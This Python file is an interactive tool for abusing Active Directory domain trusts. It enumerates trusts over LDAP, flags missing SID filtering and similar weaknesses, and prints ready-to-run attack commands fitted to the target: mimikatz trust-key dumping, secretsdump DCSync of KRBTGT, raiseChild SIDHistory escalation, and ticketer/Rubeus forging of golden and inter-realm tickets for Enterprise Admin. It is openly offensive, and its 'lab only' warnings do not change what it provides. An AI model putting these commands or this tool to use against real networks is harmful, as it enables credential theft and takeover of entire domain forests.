#!/usr/bin/env python3


import argparse
import sys
import os
import logging
import socket
import signal
import time
import ipaddress
import getpass
import ctypes
from datetime import datetime
from typing import Dict, List, Optional, Any
from binascii import hexlify

# ─────────────────────────────────────────────────────────────────────────────
# MD4 FIX: Enable legacy OpenSSL providers for NTLM authentication
# Modern systems (OpenSSL 3.x) disable MD4 by default, breaking ldap3 NTLM
# ─────────────────────────────────────────────────────────────────────────────
def _enable_md4():
    """Try to enable MD4 support for NTLM authentication."""
    try:
        ctypes.CDLL("libssl.so.3").OSSL_PROVIDER_load(None, b"legacy")
        ctypes.CDLL("libssl.so.3").OSSL_PROVIDER_load(None, b"default")
        return True
    except:
        pass
    try:
        ctypes.CDLL("libssl.so").OSSL_PROVIDER_load(None, b"legacy")
        ctypes.CDLL("libssl.so").OSSL_PROVIDER_load(None, b"default")
        return True
    except:
        pass
    try:
        from Crypto.Hash import MD4
        return True
    except ImportError:
        pass
    return False

_MD4_ENABLED = _enable_md4()

# ─────────────────────────────────────────────────────────────────────────────
# GLOBALS & INTERRUPT HANDLING
# ─────────────────────────────────────────────────────────────────────────────
INTERRUPTED = False

def signal_handler(sig, frame):
    global INTERRUPTED
    INTERRUPTED = True
    print("\n[!] Interrupted by user (Ctrl+C). Exiting gracefully...")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

# ─────────────────────────────────────────────────────────────────────────────
# COLORS
# ─────────────────────────────────────────────────────────────────────────────
R  = "\033[91m"
G  = "\033[92m"
Y  = "\033[93m"
B  = "\033[94m"
C  = "\033[96m"
W  = "\033[97m"
M  = "\033[95m"
BO = "\033[1m"
RS = "\033[0m"

# ─────────────────────────────────────────────────────────────────────────────
# UTILITY: VALIDATE IP / DOMAIN / CONNECTIVITY
# ─────────────────────────────────────────────────────────────────────────────
def validate_ip(ip_str):
    """Validate IP address format."""
    try:
        ipaddress.ip_address(ip_str)
        return True
    except ValueError:
        return False

def check_host_reachable(ip, port=389, timeout=3):
    """Check if host is reachable on a given port."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((ip, port))
        sock.close()
        return result == 0
    except Exception:
        return False

def resolve_domain(dc_ip, domain):
    """Try to resolve the domain via DNS."""
    try:
        socket.gethostbyname(domain)
        return True
    except socket.gaierror:
        return False

def validate_lab_config(dc_ip, domain):
    """Comprehensive validation of lab configuration."""
    errors = []
    warnings = []

    if not validate_ip(dc_ip):
        errors.append("Invalid IP address format: '%s'" % dc_ip)
    else:
        ports_to_check = {
            389: "LDAP",
            636: "LDAPS",
            445: "SMB",
            88: "Kerberos",
            53: "DNS"
        }
        open_ports = []
        for port, name in ports_to_check.items():
            if check_host_reachable(dc_ip, port, timeout=2):
                open_ports.append("%s (%d)" % (name, port))

        if not open_ports:
            warnings.append("No common AD ports open on %s. Is this the correct DC IP?" % dc_ip)
        else:
            print("  %s[+] Reachable ports: %s%s" % (G, ", ".join(open_ports), RS))

    if not domain or "." not in domain:
        errors.append("Invalid domain format: '%s' (expected FQDN like domain.com)" % domain)

    if not resolve_domain(dc_ip, domain):
        warnings.append("Cannot resolve domain '%s'. DNS may be misconfigured or domain is wrong." % domain)

    if errors:
        print("\n%s%s[✗] CRITICAL ERRORS:%s" % (R, BO, RS))
        for err in errors:
            print("  %s  • %s%s" % (R, err, RS))

    if warnings:
        print("\n%s%s[!] WARNINGS:%s" % (Y, BO, RS))
        for warn in warnings:
            print("  %s  • %s%s" % (Y, warn, RS))

    if errors:
        print("\n%s[!] Please fix the errors above and try again.%s" % (R, RS))
        return False

    if warnings:
        print("\n%s[?] Warnings detected. Continue anyway? (y/N): %s" % (Y, RS), end="")
        try:
            choice = input().strip().lower()
            if choice not in ("y", "yes"):
                print("%s[~] Aborted by user.%s" % (Y, RS))
                return False
        except (EOFError, KeyboardInterrupt):
            print("\n%s[~] Aborted.%s" % (Y, RS))
            return False

    return True

# ─────────────────────────────────────────────────────────────────────────────
# SAFE INPUT HANDLER (Ctrl+C safe)
# ─────────────────────────────────────────────────────────────────────────────
def safe_input(prompt, default=""):
    """Input that handles Ctrl+C gracefully."""
    try:
        return input(prompt).strip()
    except (EOFError, KeyboardInterrupt):
        print("\n%s[!] Input interrupted. Returning to menu...%s" % (Y, RS))
        return None

def safe_getpass(prompt):
    """getpass that handles Ctrl+C gracefully."""
    try:
        return getpass.getpass(prompt)
    except (EOFError, KeyboardInterrupt):
        print("\n%s[!] Input interrupted. Returning to menu...%s" % (Y, RS))
        return None

# ─────────────────────────────────────────────────────────────────────────────
# LDAP3 IMPORT (with graceful fallback)
# ─────────────────────────────────────────────────────────────────────────────
try:
    from ldap3 import Server, Connection, ALL, NTLM, SUBTREE, LEVEL
    from ldap3.core.exceptions import LDAPException, LDAPSocketOpenError, LDAPBindError
    LDAP3_AVAILABLE = True
except ImportError:
    print("%s[!] ldap3 library not found. Install with: pip install ldap3%s" % (Y, RS))
    LDAP3_AVAILABLE = False

# Check MD4 availability and warn
import hashlib
try:
    hashlib.new("md4", b"test")
    MD4_AVAILABLE = True
except ValueError:
    MD4_AVAILABLE = False
    print("%s[!] Warning: MD4 hash not available. NTLM auth may fail.%s" % (Y, RS))
    print("%s    Fix: pip install pycryptodome  OR  enable OpenSSL legacy provider%s" % (Y, RS))

# ─────────────────────────────────────────────────────────────────────────────
# INTERACTIVE CONFIG
# ─────────────────────────────────────────────────────────────────────────────
def get_config():
    print("\n%s%s╔════════════════════════════════════════════════════════╗" % (M, BO))
    print("║                 A D   T R U S T   A B U S E                  ║")
    print("║           Enumerate | Decode | Simulate | Exploit            ║")
    print("╚══════════════════════════════════════════════════════════════╝%s" % RS)

    print("\n%s%s[ Lab Configuration ]%s" % (C, BO, RS))
    print("  %sPress Enter to use default value shown in [ ]%s\n" % (Y, RS))

    dc_ip = safe_input("  %sDC IP      %s[192.168.x.x]%s: %s" % (W, C, W, RS))
    if dc_ip is None:
        return None, None
    if not dc_ip:
        dc_ip = "192.168.x.x"

    domain = safe_input("  %sDomain     %s[domain.com]%s:       %s" % (W, C, W, RS))
    if domain is None:
        return None, None
    if not domain:
        domain = "domain.com"

    print("\n%s[*] Validating lab configuration...%s" % (B, RS))
    if not validate_lab_config(dc_ip, domain):
        return None, None

    print("\n  %s[+] Using: %s | %s%s\n" % (G, dc_ip, domain, RS))
    return dc_ip, domain


def get_creds():
    print("\n%s%s[ Credentials ]%s" % (C, BO, RS))

    username = safe_input("  %sUsername %s[Administrator]%s: %s" % (W, C, W, RS))
    if username is None:
        return None, None, None
    if not username:
        username = "Administrator"

    print("\n  %sAuth method:%s" % (W, RS))
    print("    %s[1]%s Password%s" % (C, W, RS))
    print("    %s[2]%s NT Hash%s" % (C, W, RS))
    ch = safe_input("\n  Choice %s[1]%s: %s" % (C, W, RS))
    if ch is None:
        return None, None, None
    ch = ch or "1"

    password = ""
    nt_hash = ""

    if ch == "2":
        nt_hash = safe_input("  %sNT Hash: %s" % (W, RS))
        if nt_hash is None:
            return None, None, None
    else:
        password = safe_getpass("  %sPassword: %s" % (W, RS))
        if password is None:
            return None, None, None

    return username, password, nt_hash


# ─────────────────────────────────────────────────────────────────────────────
# MENU
# ─────────────────────────────────────────────────────────────────────────────
def show_menu():
    print("\n  %s┌─────────────────────────────────────────────────────────────┐" % C)
    print("  │              SELECT TRUST ABUSE TECHNIQUE                   │")
    print("  ├─────────────────────────────────────────────────────────────┤")
    print("  │  %s[1] enumerate  — Enumerate all domain trusts via LDAP   %s  │" % (W, C))
    print("  │  %s[2] decode     — Decode trust flags & attributes        %s  │" % (W, C))
    print("  │  %s[3] simulate   — Simulate abuse paths (dry-run)         %s  │" % (W, C))
    print("  │  %s[4] intraforest— Intra-forest trust abuse (SIDHistory)    %s  │" % (W, C))
    print("  │  %s[5] crossforest— Cross-forest trust abuse (TGT forge)     %s  │" % (W, C))
    print("  │  %s[6] sidfilter  — Check SID filtering status              %s  │" % (W, C))
    print("  │  %s[7] trustkeys  — Extract trust keys (requires DA)         %s  │" % (W, C))
    print("  │  %s[8] exploit    — Full exploitation chain (DANGEROUS)     %s  │" % (W, C))
    print("  │  %s[0] exit                                                    %s  │" % (W, C))
    print("  └─────────────────────────────────────────────────────────────┘%s" % RS)
    return safe_input("\n  %s❯ %s" % (W, RS))


# ════════════════════════════════════════════════════════════════════════════
# TRUST ABUSE SCRIPT CLASS
# ════════════════════════════════════════════════════════════════════════════
class TrustAbuseScript:
    def __init__(self, dc_ip, domain, username, password, nt_hash):
        self.dc_ip = dc_ip
        self.domain = domain
        self.username = username
        self.password = password
        self.nt_hash = nt_hash
        self.conn = None
        self.trusts = []
        self.logger = self._setup_logger()

    def _setup_logger(self):
        logger = logging.getLogger("trust_abuse")
        logger.setLevel(logging.DEBUG)

        if not logger.handlers:
            fh = logging.FileHandler("trust_abuse.log")
            fh.setLevel(logging.DEBUG)
            ch = logging.StreamHandler(sys.stdout)
            ch.setLevel(logging.INFO)
            formatter = logging.Formatter("%(asctime)s - %(levelname)s - %(message)s")
            fh.setFormatter(formatter)
            ch.setFormatter(formatter)
            logger.addHandler(fh)
            logger.addHandler(ch)

        return logger

    def connect_ldap(self) -> bool:
        """Establish LDAP connection with comprehensive error handling."""
        if not LDAP3_AVAILABLE:
            print("%s[!] ldap3 library not available.%s" % (R, RS))
            return False

        print("\n  %s[*] Connecting to LDAP server %s...%s" % (B, self.dc_ip, RS))

        try:
            server = Server(
                self.dc_ip,
                get_info=ALL,
                use_ssl=False,
                connect_timeout=10
            )

            user = "%s\\%s" % (self.domain, self.username)

            self.conn = Connection(
                server,
                user=user,
                password=self.password if self.password else self.nt_hash,
                authentication=NTLM,
                auto_bind=True,
                read_only=True
            )

            print("  %s[+] Successfully bound to %s as %s%s" % (G, self.dc_ip, user, RS))
            self.logger.info("[+] LDAP bind successful: %s@%s" % (user, self.dc_ip))
            return True

        except LDAPSocketOpenError as e:
            print("  %s[!] Connection failed: Cannot reach DC at %s%s" % (R, self.dc_ip, RS))
            print("  %s    -> Check: Is the IP correct? Is the DC running? Firewall?%s" % (R, RS))
            self.logger.error("[-] LDAP connection timeout: %s" % e)
            return False

        except ValueError as e:
            err_str = str(e).lower()
            if "md4" in err_str:
                print("  %s[!] MD4 hash algorithm not available%s" % (R, RS))
                print("  %s    This is a known issue on modern systems (OpenSSL 3.x)%s" % (R, RS))
                print("\n  %s[FIX] Try one of these solutions:%s" % (Y, RS))
                print("  %s  1. Install pycryptodome:%s" % (C, RS))
                print("  %s     pip install pycryptodome%s" % (W, RS))
                print("  %s  2. Enable legacy OpenSSL providers:%s" % (C, RS))
                print("  %s     Edit /etc/ssl/openssl.cnf and add legacy provider%s" % (W, RS))
                print("  %s  3. Use Kerberos auth instead of NTLM (if available)%s" % (C, RS))
                print("  %s     # Requires valid Kerberos ticket (kinit)%s" % (W, RS))
                print("\n  %s[!] The script attempted to auto-enable MD4 but failed.%s" % (Y, RS))
            else:
                print("  %s[!] Value error: %s%s" % (R, e, RS))
            self.logger.error("[-] LDAP ValueError: %s" % e)
            return False

        except LDAPBindError as e:
            error_msg = str(e).lower()
            if "invalid credentials" in error_msg:
                print("  %s[!] Bind failed: Invalid credentials%s" % (R, RS))
                print("  %s    -> Check: Wrong password, or user does not exist in domain '%s'%s" % (R, self.domain, RS))
            elif "stronger authentication required" in error_msg:
                print("  %s[!] Bind failed: LDAP signing required%s" % (R, RS))
                print("  %s    -> Try: Use LDAPS (port 636) or disable signing%s" % (R, RS))
            else:
                print("  %s[!] Bind failed: %s%s" % (R, e, RS))
            self.logger.error("[-] LDAP bind failed: %s" % e)
            return False

        except Exception as e:
            print("  %s[!] Unexpected LDAP error: %s%s" % (R, e, RS))
            self.logger.error("[-] Unexpected LDAP error: %s" % e)
            return False

    def enumerate_trusts(self) -> List[Dict]:
        """Enumerate trustedDomain objects from AD."""
        if not self.conn:
            print("%s[!] No LDAP connection. Run connect first.%s" % (R, RS))
            return []

        print("\n  %s[*] Enumerating domain trusts...%s" % (B, RS))

        try:
            search_base = "DC=" + self.domain.replace(".", ",DC=")
            filter_str = "(objectClass=trustedDomain)"

            self.conn.search(
                search_base=search_base,
                search_filter=filter_str,
                search_scope=SUBTREE,
                attributes=[
                    "cn", "trustAttributes", "trustDirection", "trustType",
                    "trustPartner", "flatName", "securityIdentifier",
                    "trustAuthIncoming", "trustAuthOutgoing", "whenCreated",
                    "whenChanged"
                ]
            )

            trusts = []
            for entry in self.conn.entries:
                trust_info = {
                    "dn": str(entry.dn),
                    "cn": str(entry.get("cn", "")),
                    "trustPartner": str(entry.get("trustPartner", "")),
                    "flatName": str(entry.get("flatName", "")),
                    "trustType": self._decode_trust_type(entry.get("trustType")),
                    "trustDirection": self._decode_trust_direction(entry.get("trustDirection")),
                    "trustAttributes": self._decode_trust_attributes(entry.get("trustAttributes")),
                    "sid": str(entry.get("securityIdentifier", "")),
                    "whenCreated": str(entry.get("whenCreated", "")),
                    "whenChanged": str(entry.get("whenChanged", ""))
                }
                trusts.append(trust_info)

                print("\n  %s%s[ Trust Found ]%s" % (G, BO, RS))
                print("  %s  Partner:      %s%s%s" % (W, C, trust_info["trustPartner"], RS))
                print("  %s  Flat Name:    %s%s%s" % (W, C, trust_info["flatName"], RS))
                print("  %s  Type:         %s%s%s" % (W, Y, trust_info["trustType"], RS))
                print("  %s  Direction:    %s%s%s" % (W, Y, trust_info["trustDirection"], RS))
                print("  %s  Attributes:   %s%s%s" % (W, M, trust_info["trustAttributes"], RS))
                print("  %s  SID:          %s%s%s" % (W, C, trust_info["sid"], RS))
                print("  %s  Created:      %s%s" % (W, trust_info["whenCreated"]))

            if not trusts:
                print("  %s[!] No trusts found. Either:%s" % (Y, RS))
                print("  %s    - This is a single-domain forest%s" % (Y, RS))
                print("  %s    - Insufficient permissions to read trustedDomain objects%s" % (Y, RS))
                print("  %s    - Trusts exist but are not visible to this user%s" % (Y, RS))
            else:
                print("\n  %s%sTotal trusts found: %d%s" % (G, BO, len(trusts), RS))

            self.trusts = trusts
            self.logger.info("[+] Found %d trust(s)" % len(trusts))
            return trusts

        except Exception as e:
            print("  %s[!] Trust enumeration failed: %s%s" % (R, e, RS))
            self.logger.error("[-] Trust enumeration failed: %s" % e)
            return []

    def _decode_trust_type(self, val) -> str:
        if not val:
            return "Unknown"
        types = {
            1: "Downlevel (NT4)",
            2: "Uplevel (AD)",
            3: "MIT Kerberos Realm",
            4: "DCE (deprecated)"
        }
        return types.get(int(str(val)), "Type-%s" % val)

    def _decode_trust_direction(self, val) -> str:
        if not val:
            return "Unknown"
        dirs = {
            0: "Disabled",
            1: "Inbound",
            2: "Outbound",
            3: "Bidirectional (Two-way)"
        }
        return dirs.get(int(str(val)), "Dir-%s" % val)

    def _decode_trust_attributes(self, val) -> str:
        if not val:
            return "None"
        try:
            attr_val = int(str(val))
            attrs = []
            flags = {
                0x00000001: "NON_TRANSITIVE",
                0x00000002: "UPLEVEL_ONLY",
                0x00000004: "FILTER_SIDS (QUARANTINED)",
                0x00000008: "FOREST_TRANSITIVE",
                0x00000010: "CROSS_ORGANIZATION",
                0x00000020: "WITHIN_FOREST",
                0x00000040: "TREAT_AS_EXTERNAL",
                0x00000080: "TRUST_USES_RC4_ENCRYPTION",
                0x00000100: "TRUST_USES_AES_KEYS",
                0x00000200: "CROSS_ORGANIZATION_NO_TGT_DELEGATION",
                0x00000400: "PIM_TRUST"
            }
            for flag, name in flags.items():
                if attr_val & flag:
                    attrs.append(name)
            return " | ".join(attrs) if attrs else "Raw: %d" % attr_val
        except:
            return str(val)

    def decode_trusts(self):
        """Deep decode of all trust properties."""
        if not self.trusts:
            print("%s[!] No trusts to decode. Run enumerate first.%s" % (Y, RS))
            return

        print("\n%s%s[ TRUST DECODE — Full Analysis ]%s" % (C, BO, RS))
        print("─" * 70)

        for i, trust in enumerate(self.trusts, 1):
            print("\n  %s%sTrust #%d: %s%s" % (BO, M, i, trust["trustPartner"], RS))
            print("  %s  Distinguished Name: %s%s%s" % (W, C, trust["dn"], RS))
            print("  %s  Trust Type:         %s%s%s" % (W, Y, trust["trustType"], RS))
            print("  %s  Direction:          %s%s%s" % (W, Y, trust["trustDirection"], RS))
            print("  %s  Attributes:           %s%s%s" % (W, M, trust["trustAttributes"], RS))
            print("  %s  SID:                  %s%s%s" % (W, C, trust["sid"], RS))

            print("\n  %s%s[ Risk Assessment ]%s" % (BO, R, RS))
            risks = []
            if "FOREST_TRANSITIVE" in trust["trustAttributes"]:
                risks.append("FOREST trust — High value target for cross-forest attacks")
            if "WITHIN_FOREST" in trust["trustAttributes"]:
                risks.append("Intra-forest trust — SIDHistory abuse possible")
            if "FILTER_SIDS" not in trust["trustAttributes"] and "CROSS_ORGANIZATION" not in trust["trustAttributes"]:
                if trust["trustDirection"] in ("Inbound", "Bidirectional (Two-way)"):
                    risks.append("SID filtering NOT enabled — VULNERABLE to SIDHistory injection!")
            if "TRUST_USES_RC4_ENCRYPTION" in trust["trustAttributes"]:
                risks.append("RC4 encryption enabled — Kerberoasting / TGT forging possible")
            if "NON_TRANSITIVE" in trust["trustAttributes"]:
                risks.append("Non-transitive trust — Limits lateral movement scope")

            if risks:
                for risk in risks:
                    print("    %s⚠ %s%s" % (R, risk, RS))
            else:
                print("    %s✓ No immediate risks identified%s" % (G, RS))

            print("─" * 70)

    def simulate_abuse(self):
        """Safe simulation of abuse paths (dry-run)."""
        if not self.trusts:
            print("%s[!] No trusts to simulate. Run enumerate first.%s" % (Y, RS))
            return

        print("\n%s%s[ ABUSE SIMULATION — Dry Run ]%s" % (C, BO, RS))
        print("%s  No actual changes will be made. Showing attack paths only.%s\n" % (Y, RS))

        for trust in self.trusts:
            print("\n  %s%sTarget Trust: %s%s" % (BO, M, trust["trustPartner"], RS))

            print("\n  %s[1] Trust Key Extraction (requires DA on trusting domain)%s" % (C, RS))
            print("  %s    mimikatz # lsadump::trust /patch%s" % (W, RS))
            print("  %s    python3 secretsdump.py %s/%s@%s -just-dc-user 'KRBTGT'%s" % (W, self.domain, self.username, self.dc_ip, RS))

            if "WITHIN_FOREST" in trust["trustAttributes"]:
                print("\n  %s[2] Intra-Forest SIDHistory Abuse%s" % (C, RS))
                print("  %s    python3 raiseChild.py %s/%s:%s@%s%s" % (W, trust["trustPartner"], self.username, self.password, trust["trustPartner"], RS))
                print("  %s    -> Inject SIDHistory to escalate to Enterprise Admin%s" % (W, RS))

            if "FOREST_TRANSITIVE" in trust["trustAttributes"]:
                print("\n  %s[3] Cross-Forest TGT Forging (ExtraSIDs)%s" % (C, RS))
                print("  %s    python3 raiseChild.py %s/%s:%s@%s%s" % (W, trust["trustPartner"], self.username, self.password, trust["trustPartner"], RS))
                print("  %s    -> Forge inter-realm TGT with Enterprise Admin SID%s" % (W, RS))

            if "FILTER_SIDS" not in trust["trustAttributes"]:
                print("\n  %s[4] SIDHistory Injection (No Filtering)%s" % (C, RS))
                print("  %s    python3 ticketer.py -nthash <trust_key> -domain-sid <sid> -domain %s -extra-sid <target_sid>-519 golden_trust%s" % (W, trust["trustPartner"], RS))

            print("\n  %s[5] DCSync Across Trust%s" % (C, RS))
            print("  %s    python3 secretsdump.py '%s/%s:%s@%s'%s" % (W, trust["trustPartner"], self.username, self.password, trust["trustPartner"], RS))

            print("\n  %s[!] All commands are for educational/dry-run purposes only.%s" % (Y, RS))

    def check_sid_filtering(self):
        """Check SID filtering status on trusts."""
        if not self.trusts:
            print("%s[!] No trusts to check. Run enumerate first.%s" % (Y, RS))
            return

        print("\n%s%s[ SID FILTERING STATUS ]%s" % (C, BO, RS))
        print("─" * 70)

        for trust in self.trusts:
            partner = trust["trustPartner"]
            attrs = trust["trustAttributes"]

            print("\n  %s%sTrust: %s%s" % (BO, W, partner, RS))

            if "FILTER_SIDS" in attrs or "QUARANTINED" in attrs:
                print("  %s  ✓ SID Filtering ENABLED%s" % (G, RS))
                print("  %s    -> SIDHistory attacks BLOCKED%s" % (G, RS))
            else:
                print("  %s  ✗ SID Filtering DISABLED%s" % (R, RS))
                print("  %s    -> VULNERABLE to SIDHistory injection!%s" % (R, RS))
                print("  %s    -> Attack: Inject Enterprise Admin SID from trusted domain%s" % (R, RS))

            if "FOREST_TRANSITIVE" in attrs:
                print("  %s  ! Forest transitive trust — Check selective authentication%s" % (Y, RS))

            if "WITHIN_FOREST" in attrs:
                print("  %s  ! Intra-forest trust — No SID filtering by design%s" % (Y, RS))
                print("  %s    -> All SIDs are transitive within the forest%s" % (Y, RS))

        print("─" * 70)

    def extract_trust_keys(self):
        """Show commands to extract trust keys (requires DA)."""
        print("\n%s%s[ TRUST KEY EXTRACTION ]%s" % (C, BO, RS))
        print("%s  Requires Domain Admin or equivalent privileges%s\n" % (Y, RS))

        print("  %sMethod 1: DCSync (remotely)%s" % (C, RS))
        print("  %s  python3 secretsdump.py %s/%s:%s@%s -just-dc-user 'KRBTGT'%s" % (W, self.domain, self.username, self.password, self.dc_ip, RS))
        print("  %s  python3 secretsdump.py %s/%s:%s@%s -history%s" % (W, self.domain, self.username, self.password, self.dc_ip, RS))

        print("\n  %sMethod 2: Mimikatz (on DC)%s" % (C, RS))
        print("  %s  mimikatz # lsadump::trust /patch%s" % (W, RS))
        print("  %s  mimikatz # lsadump::lsa /patch%s" % (W, RS))

        print("\n  %sMethod 3: LSA secrets (local admin on DC)%s" % (C, RS))
        print("  %s  mimikatz # lsadump::secrets%s" % (W, RS))

        print("\n  %s[!] Trust keys enable TGT forging across domains%s" % (Y, RS))
        print("  %s    Once extracted, use ticketer.py or Rubeus to forge inter-realm TGTs%s" % (Y, RS))

    def intra_forest_abuse(self):
        """Intra-forest trust abuse techniques."""
        print("\n%s%s[ INTRA-FOREST TRUST ABUSE ]%s" % (C, BO, RS))
        print("%s  Targets: Child domains, same forest%s\n" % (Y, RS))

        print("  %s[1] SIDHistory Injection%s" % (C, RS))
        print("  %s  python3 raiseChild.py child.parent.local/admin:pass@child.parent.local%s" % (W, RS))
        print("  %s  -> Automatically elevates to Enterprise Admin in parent domain%s" % (W, RS))

        print("\n  %s[2] Golden Ticket (Enterprise Admin)%s" % (C, RS))
        print("  %s  python3 ticketer.py -nthash <krbtgt_hash> -domain-sid <domain_sid> -domain %s -extra-sid <root_domain_sid>-519 golden_ticket%s" % (W, self.domain, RS))

        print("\n  %s[3] DCSync Parent Domain%s" % (C, RS))
        print("  %s  python3 secretsdump.py '%s/%s:%s@%s'%s" % (W, self.domain, self.username, self.password, self.dc_ip, RS))

        print("\n  %s[!] Intra-forest trusts have NO SID filtering by design%s" % (Y, RS))
        print("  %s    Any SID from any domain in the forest is valid everywhere%s" % (Y, RS))

    def cross_forest_abuse(self):
        """Cross-forest trust abuse techniques."""
        print("\n%s%s[ CROSS-FOREST TRUST ABUSE ]%s" % (C, BO, RS))
        print("%s  Targets: External forests, cross-forest trusts%s\n" % (Y, RS))

        print("  %s[1] ExtraSIDs / TGT Forging%s" % (C, RS))
        print("  %s  python3 ticketer.py -nthash <trust_key> -domain-sid <trusted_domain_sid> -domain %s -extra-sid <target_domain_sid>-519 -spn krbtgt/target.forest.local cross_forest_ticket%s" % (W, self.domain, RS))

        print("\n  %s[2] raiseChild for Cross-Forest%s" % (C, RS))
        print("  %s  python3 raiseChild.py target.forest.local/admin:pass@target.forest.local%s" % (W, RS))

        print("\n  %s[3] Rubeus Cross-Forest TGT%s" % (C, RS))
        print("  %s  Rubeus.exe asktgs /ticket:cross_forest.kirbi /service:cifs/target.forest.local /ptt%s" % (W, RS))

        print("\n  %s[!] Cross-forest trusts MAY have SID filtering enabled%s" % (Y, RS))
        print("  %s    Check SID filtering status before attempting ExtraSIDs%s" % (Y, RS))
        print("  %s    If filtering is ON, SIDHistory injection will fail%s" % (Y, RS))

    def full_exploit_chain(self):
        """Full exploitation chain (DANGEROUS — requires confirmation)."""
        print("\n%s%s[ ⚠ FULL EXPLOITATION CHAIN ⚠ ]%s" % (R, BO, RS))
        print("%s  This will attempt REAL attacks on your lab environment.%s" % (R, RS))
        print("%s  Only use on systems you OWN and CONTROL.%s\n" % (R, RS))

        confirm = safe_input("  %sType 'EXPLOIT' to proceed: %s" % (R, RS))
        if confirm != "EXPLOIT":
            print("%s[!] Aborted. You did not type 'EXPLOIT'.%s" % (Y, RS))
            return

        print("\n  %s[*] Starting exploitation chain...%s" % (B, RS))

        if not self.trusts:
            print("  %s[!] No trusts enumerated. Running enumeration first...%s" % (Y, RS))
            self.enumerate_trusts()

        for trust in self.trusts:
            print("\n  %s[*] Processing trust: %s%s" % (B, trust["trustPartner"], RS))

            if "WITHIN_FOREST" in trust["trustAttributes"]:
                print("  %s[!] Intra-forest detected — SIDHistory abuse viable%s" % (Y, RS))
                print("  %s  Run: python3 raiseChild.py %s/%s:%s@%s%s" % (W, trust["trustPartner"], self.username, self.password, trust["trustPartner"], RS))

            if "FOREST_TRANSITIVE" in trust["trustAttributes"]:
                if "FILTER_SIDS" not in trust["trustAttributes"]:
                    print("  %s[!] Cross-forest WITHOUT SID filtering — HIGH RISK%s" % (R, RS))
                    print("  %s  Step 1: Extract trust key via DCSync%s" % (W, RS))
                    print("  %s  Step 2: Forge inter-realm TGT with ExtraSIDs%s" % (W, RS))
                    print("  %s  Step 3: Request service ticket in target domain%s" % (W, RS))
                else:
                    print("  %s[+] Cross-forest WITH SID filtering — Protected%s" % (G, RS))

    def run_technique(self, choice):
        """Execute selected technique."""
        if choice == "1":
            self.enumerate_trusts()
        elif choice == "2":
            self.decode_trusts()
        elif choice == "3":
            self.simulate_abuse()
        elif choice == "4":
            self.intra_forest_abuse()
        elif choice == "5":
            self.cross_forest_abuse()
        elif choice == "6":
            self.check_sid_filtering()
        elif choice == "7":
            self.extract_trust_keys()
        elif choice == "8":
            self.full_exploit_chain()


# ─────────────────────────────────────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────────────────────────────────────
def main():
    try:
        dc_ip, domain = get_config()
        if dc_ip is None or domain is None:
            print("\n%s[!] Configuration cancelled.%s" % (Y, RS))
            sys.exit(0)

        creds = get_creds()
        if creds[0] is None:
            print("\n%s[!] Credentials cancelled.%s" % (Y, RS))
            sys.exit(0)
        username, password, nt_hash = creds

        script = TrustAbuseScript(dc_ip, domain, username, password, nt_hash)

        while True:
            if INTERRUPTED:
                break

            choice = show_menu()
            if choice is None:
                continue

            if choice == "0":
                print("\n  %sBye!%s\n" % (Y, RS))
                break

            if choice in ("1", "2", "3", "4", "5", "6", "7", "8"):
                if choice != "1" and not script.conn:
                    print("\n%s[!] LDAP connection required. Connecting first...%s" % (Y, RS))
                    if not script.connect_ldap():
                        print("%s[!] Connection failed. Cannot proceed.%s" % (R, RS))
                        safe_input("\n  %sPress Enter to return to menu...%s" % (Y, RS))
                        continue

                if choice == "1":
                    if not script.connect_ldap():
                        safe_input("\n  %sPress Enter to return to menu...%s" % (Y, RS))
                        continue

                script.run_technique(choice)
            else:
                print("  %sInvalid choice%s" % (R, RS))

            try:
                safe_input("\n  %sPress Enter to return to menu...%s" % (Y, RS))
            except:
                pass

    except KeyboardInterrupt:
        print("\n\n%s[!] Interrupted by user. Exiting...%s" % (Y, RS))
        sys.exit(0)
    except Exception as e:
        print("\n%s[!] Fatal error: %s%s" % (R, e, RS))
        sys.exit(1)


if __name__ == "__main__":
    main()
